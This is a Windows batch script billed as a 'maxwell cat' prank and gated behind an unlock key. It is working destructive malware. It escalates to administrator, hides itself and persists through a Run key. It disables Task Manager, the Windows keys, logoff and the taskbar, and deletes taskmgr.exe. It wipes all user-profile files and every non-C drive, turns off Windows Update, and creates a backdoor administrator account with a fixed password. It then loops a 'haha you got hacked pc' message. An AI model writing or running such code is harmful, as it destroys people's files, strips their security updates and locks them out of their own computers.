@echo off
title maxwell cat
color 0C
setlocal

rem ============================================================
rem  MAWXELL CAT - LOCKED FINAL
rem  paste the key from maxwell_cat_key.bat to unlock
rem ============================================================

rem ---------------- KEY GATE ----------------
if exist "%SystemRoot%\Temp\mc_hidden.flag" goto :payload
if exist "%SystemRoot%\Temp\mc_unlocked.flag" goto :arm

cls
echo.
echo   ================================================
echo          MAXWELL CAT  -  LOCKED
echo   ================================================
echo.
if not exist "%SystemRoot%\Temp\mawxell_cat_keys\key.txt" (
    echo   [X] NO KEY FOUND
    echo       run  maxwell_cat_key.bat  first
    pause
    exit /b
)
set /p KEY=  ENTER KEY: 
set "KEY=%KEY: =%"
set /p STORED=<"%SystemRoot%\Temp\mawxell_cat_keys\key.txt"
if /i not "%KEY%"=="%STORED%" (
    echo.
    echo   [X] WRONG KEY - still locked
    pause
    exit /b
)
> "%SystemRoot%\Temp\mc_unlocked.flag" echo 1
:arm

rem ---------------- OS GATE ----------------
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName 2>nul | findstr /i /c:"Windows 10" /c:"Windows 11" >nul
if errorlevel 1 goto :notok

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoP -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

copy /y "%~f0" "%SystemRoot%\Temp\maxwell_cat.bat" >nul 2>&1
> "%SystemRoot%\Temp\mc_hidden.flag" echo 1

> "%SystemRoot%\Temp\mchide.vbs" echo Set o = CreateObject("WScript.Shell")
>> "%SystemRoot%\Temp\mchide.vbs" echo o.Run "%SystemRoot%\Temp\maxwell_cat.bat", 0, False
wscript //nologo "%SystemRoot%\Temp\mchide.vbs"
exit /b

:payload
cd /d "%SystemRoot%\Temp"
attrib +h "%SystemRoot%\Temp\maxwell_cat.bat" "%SystemRoot%\Temp\mchide.vbs" "%SystemRoot%\Temp\mc_hidden.flag" >nul 2>&1

rem ============ 0) FAKE BIOS LOCKUP (cosmetic, VM-safe) ============
> "%SystemRoot%\Temp\fakebios.ps1" echo Add-Type -AssemblyName System.Windows.Forms,System.Drawing
>> "%SystemRoot%\Temp\fakebios.ps1" echo $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f=New-Object System.Windows.Forms.Form
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.FormBorderStyle='None'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.Bounds=$s
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.TopMost=$true
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.BackColor='Black'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l=New-Object System.Windows.Forms.Label
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.ForeColor='White'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.BackColor='Black'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Font=New-Object System.Drawing.Font('Consolas',20,[System.Drawing.FontStyle]::Bold)
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Dock='Fill'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.TextAlign='MiddleLeft'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.Controls.Add($l)
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.Show()
>> "%SystemRoot%\Temp\fakebios.ps1" echo $t=''
>> "%SystemRoot%\Temp\fakebios.ps1" echo $lines=@('MAWXELL BIOS v13.0','','CPU  : NO DETECT ............ FAIL','MEM  : 0 MB OK .............. ERROR','CMOS : CHECKSUM ............. INVALID','HDD  : BOOT DEVICE .......... LOCKED','FAN  : 0 RPM ................ STALL','','PRESS DEL TO ENTER SETUP  [not working]','')
>> "%SystemRoot%\Temp\fakebios.ps1" echo foreach($x in $lines){
>> "%SystemRoot%\Temp\fakebios.ps1" echo $t=$t+$x+[char]10
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Text=$t
>> "%SystemRoot%\Temp\fakebios.ps1" echo Start-Sleep -Milliseconds 600
>> "%SystemRoot%\Temp\fakebios.ps1" echo }
>> "%SystemRoot%\Temp\fakebios.ps1" echo for($i=0;$i -lt 6;$i++){
>> "%SystemRoot%\Temp\fakebios.ps1" echo $t=$t+'FLASHING MAWXELL CAT ...'+[char]10
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Text=$t
>> "%SystemRoot%\Temp\fakebios.ps1" echo Start-Sleep -Milliseconds 700
>> "%SystemRoot%\Temp\fakebios.ps1" echo }
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.ForeColor='Red'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Font=New-Object System.Drawing.Font('Consolas',34,[System.Drawing.FontStyle]::Bold)
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.TextAlign='MiddleCenter'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Text=$t+[char]10+[char]10+'        haha you got hacked pc'
>> "%SystemRoot%\Temp\fakebios.ps1" echo Start-Sleep -Seconds 4
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.Close()
powershell -NoP -EP Bypass -File "%SystemRoot%\Temp\fakebios.ps1" >nul 2>&1

set WAIT=60
timeout /t %WAIT% /nobreak >nul

rem ---------------- 1) GIF WALLPAPER (local, full HD) ----------------
if not exist "%SystemRoot%\Temp\maxwell.gif" goto :nogif
start "" powershell -NoP -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $w=(New-Object System.Windows.Forms.Form); $w.FormBorderStyle='None'; $w.Bounds=$s; $w.TopMost=$true; $p=New-Object System.Windows.Forms.PictureBox; $p.Image=[System.Drawing.Image]::FromFile('%SystemRoot%\Temp\maxwell.gif'); $p.Dock='Fill'; $p.SizeMode='StretchImage'; $w.Controls.Add($p); $w.Show(); [System.Windows.Forms.Application]::Run($w)"
:nogif

rem ---------------- 2) WIN+R ----------------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1

rem ---------------- 3) CTRL+ALT+DEL NUKED ----------------
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f >nul 2>&1
taskkill /f /im taskmgr.exe >nul 2>&1
takeown /f "%SystemRoot%\System32\taskmgr.exe" >nul 2>&1
icacls "%SystemRoot%\System32\taskmgr.exe" /grant *S-1-5-32-544:F >nul 2>&1
del /f /q "%SystemRoot%\System32\taskmgr.exe" >nul 2>&1
takeown /f "%SystemRoot%\SysWOW64\taskmgr.exe" >nul 2>&1
icacls "%SystemRoot%\SysWOW64\taskmgr.exe" /grant *S-1-5-32-544:F >nul 2>&1
del /f /q "%SystemRoot%\SysWOW64\taskmgr.exe" >nul 2>&1
gpupdate /force >nul 2>&1

rem ---------------- 4) WIN KEY ----------------
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f >nul 2>&1

rem ---------------- 5) TASKBAR HIDE ----------------
powershell -NoP -Command "$k=(Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' -EA SilentlyContinue).Settings; if($k){$k[8]=3; Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' Settings $k}; Stop-Process -Name explorer -Force -EA SilentlyContinue" >nul 2>&1

rem ---------------- 6) PERSISTENCE + BSOD + AUTO-REBOOT ----------------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v maxwell_cat /t REG_SZ /d "wscript.exe %SystemRoot%\Temp\mchide.vbs" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayMessage /t REG_SZ /d ":)" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayParameters /t REG_SZ /d "maxwell cat" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v AutoReboot /t REG_DWORD /d 1 /f >nul 2>&1

rem ---------------- 7) WIPE USER FILES (keep profiles) ----------------
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im SearchHost.exe >nul 2>&1
taskkill /f /im SearchApp.exe >nul 2>&1
taskkill /f /im OneDrive.exe >nul 2>&1
taskkill /f /im Teams.exe >nul 2>&1

powershell -NoP -Command "Get-ChildItem C:\Users -Directory | Where-Object {$_.Name -notin @('Public','Default','Default User')} | ForEach-Object { Get-ChildItem $_.FullName -Force -EA SilentlyContinue | Where-Object {$_.Name -ne 'NTUSER.DAT'} | Remove-Item -Recurse -Force -EA SilentlyContinue }"

powershell -NoP -Command "Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Name -ne 'C'} | ForEach-Object { Remove-Item ($_.Root + '*') -Recurse -Force -ErrorAction SilentlyContinue }"

rem ---------------- 7.5) DISABLE WINDOWS UPDATE (SAFE) ----------------
sc stop wuauserv >nul 2>&1
sc config wuauserv start= disabled >nul 2>&1
sc stop bits >nul 2>&1
sc config bits start= disabled >nul 2>&1
sc stop UsoSvc >nul 2>&1
sc config UsoSvc start= disabled >nul 2>&1
sc stop WaaSMedicSvc >nul 2>&1
sc config WaaSMedicSvc start= disabled >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoWindowsUpdate /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f >nul 2>&1
taskkill /f /im WUDFHost.exe >nul 2>&1
taskkill /f /im WindowsUpdate.exe >nul 2>&1
taskkill /f /im UsoClient.exe >nul 2>&1
taskkill /f /im MoUsoCoreWorker.exe >nul 2>&1

rem ---------------- 8) LOCK USER: more more more user / discord ----------------
net user "more more more user" "discord" /add /expires:never /passwordchg:no /active:yes >nul 2>&1
net localgroup Administrators "more more more user" /add >nul 2>&1
powershell -NoP -Command "Set-LocalUser -Name 'more more more user' -PasswordNeverExpires $true -ErrorAction SilentlyContinue"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "more more more user" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "discord" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "0" /f >nul 2>&1

rem ---------------- 9) AUTO-LOOP ANIMATION + hacked text ----------------
set n=0
:SPIN
set /a n+=1
set /a m=n %% 4
if %m%==0 set "sp=|"
if %m%==1 set "sp=/"
if %m%==2 set "sp=-"
if %m%==3 set "sp=\"
cls
echo.
echo        /\_/\      %sp%
echo       ( o.o )     %sp%
echo        ~~~~~      %sp%
echo.
echo   MAWXELL CAT   pass %n%
echo.
echo   haha you got hacked pc
timeout /t 1 /nobreak >nul
goto :SPIN

:notok
echo  [X] Windows 10 / 11 only.
pause
exit /b
